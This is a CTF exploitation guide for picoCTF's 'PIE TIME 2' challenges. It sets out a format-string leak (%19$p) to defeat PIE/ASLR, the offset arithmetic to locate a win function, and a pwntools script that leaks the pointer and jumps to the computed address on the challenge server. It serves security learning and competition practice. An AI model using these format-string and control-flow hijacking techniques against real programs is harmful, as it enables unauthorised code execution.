# PIE Bypass via Format String Leak + Function Pointer Jump

## Purpose
Redirect control flow of a PIE (Position-Independent Executable) binary to a `win`/`flag` function when the program lets you jump to an arbitrary address (function-pointer call, ret2win, indirect call). ASLR randomizes the load base every run, so you must first leak any in-binary pointer and derive the base.

## Decision Tree
```
Program prints "enter an address to jump to" (or calls a user-supplied function pointer)?
 ├── Does it also echo your input with printf(user_input) / printf(buffer)?
 │    ├── Yes -> FORMAT STRING leak: %p / %19$p to recover a code pointer, then jump
 │    ├── No -> Does it leak an address itself (printf("Address of main: %p"))?
 │    │        └── Yes -> compute win = leak +/- known offset, jump (PIE TIME)
 │    └── No -> ret2win/ret2libc via buffer overflow: control RIP, chain win()
 └── Which register/stack slot is a code pointer?
      ├── On amd64 the 1st vararg is often in RDX; %1$p may be a code pointer
      ├── A slot ending in ...441 / ...400 near main is a return addr in main
      └── Use positional %N$p (N = slot index) if unsanitized
```

## Recon Checklist
- [ ] Run `file`, `checksec --file=vuln` (PIE/RELRO/NX/CANARY/fortify).
- [ ] `nm vuln | grep -wE "main|win|flag|vuln"` — get compile-time function offsets (PIE: offsets are stable, bases are not).
- [ ] Read the source: look for `printf(buffer)` (format string) and `scanf("%lx")`-style address input.
- [ ] Feed `%p %p %p ...` (and `%N$p` if positional formats survive) to map which slot leaks a code pointer.
- [ ] Compute the offset between leaked pointer and target function once, verify with gdb across runs (offset stays constant).

## Reusable Commands
```bash
# Static function offsets in a PIE (offsets stable, base randomized)
nm ./vuln | grep -wE "main|win"
# Compute offset between two symbols
printf "0x%X\n" $((0x133d - 0x12a7))     # e.g. win is 0x96 bytes before main
# Protection check
checksec --file=./vuln
# Confirm leaked slot in gdb (ASLR off in gdb by default)
gdb -q ./vuln -ex 'r' -ex 'disas main' -ex 'disas win'
```

## Reusable Payloads
```
# Leak a code pointer (position 19 is a common return-address slot in PIE TIME 2)
%19$p                # -> 0x...441  (this is main+0x41)
%p %p %p %p %p ...   # bulk dump: identify code pointers vs libc (0x7f..) vs stack (0x7ff..)
```

## Exploitation Workflow
1. Identify the leak slot (e.g. `%19$p` returns a pointer ending in `441` = `main+0x41`).
2. Compute `win` address:
   - leak points at `main+0x41`; `win = leak - 0x41 - (main_offset - win_offset)`.
   - Equivalently `win = leak - 0xD7` for PIE TIME 2 (leak=main+0x41, main-win=0x96).
   - General: find both offsets with `nm`, then `win = leak + win_off - leak_slot_off`.
3. Send `hex(win)` (e.g. `0x5cb04931936a`) at the "enter the address to jump to" prompt.
4. Read the flag.

## Python Automation Example
```python
from pwn import *
r = remote('rescued-float.picoctf.net', 50075)
r.recvuntil(b'Enter your name:')
r.sendline(b'%19$p')                     # leak main+0x41
leak = int(r.recvline().split(b' ')[0], 16)
win = leak - 0xD7                        # PIE TIME 2 fixed offset
r.sendlineafter(b'enter the address to jump to, ex => 0x12345: ', hex(win).encode())
print(r.recvall().decode())
```
See `scripts/pwn_pie_leak.py` for a parameterized version.

## Common Mistakes
- Assuming the leaked base is absolute: on PIE every pointer is base+offset; recompute per run.
- Forgetting positional formats: `%19$p` works only if `$p` is not sanitized; if it is, dump `%p` * N and index manually.
- Jumping to a non-canonical/wrong address -> SIGSEGV; the custom `segfault_handler` prints "Segfault Occurred" and exits — treat that as a retry signal, not progress.
- Off-by-leak: note exactly WHICH symbol + byte the leak hits (e.g. `main+0x41`, not `main`).

## CTF Tips
- Hint "What vulnerability can be exploited to leak the address?" => format string `printf(user_input)`.
- Two-stage challenges (ask name, then ask address) are leak-then-jump: one connection, both steps.
- The offset `win vs main` is identical to the PIE TIME family across compiles (0x96) — verify, don't trust.
- `nm` works on non-stripped PIE binaries; on stripped ones use `objdump -t` or gdb symbol search.

## References
- PIE TIME / PIE TIME 2 (picoCTF 2025) — pwn, format-string leak + function pointer jump
- pwn.college / Exploit Education: format string leaks, ret2win
- PayloadsAllTheThings - Format String: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Format%20String/README.md
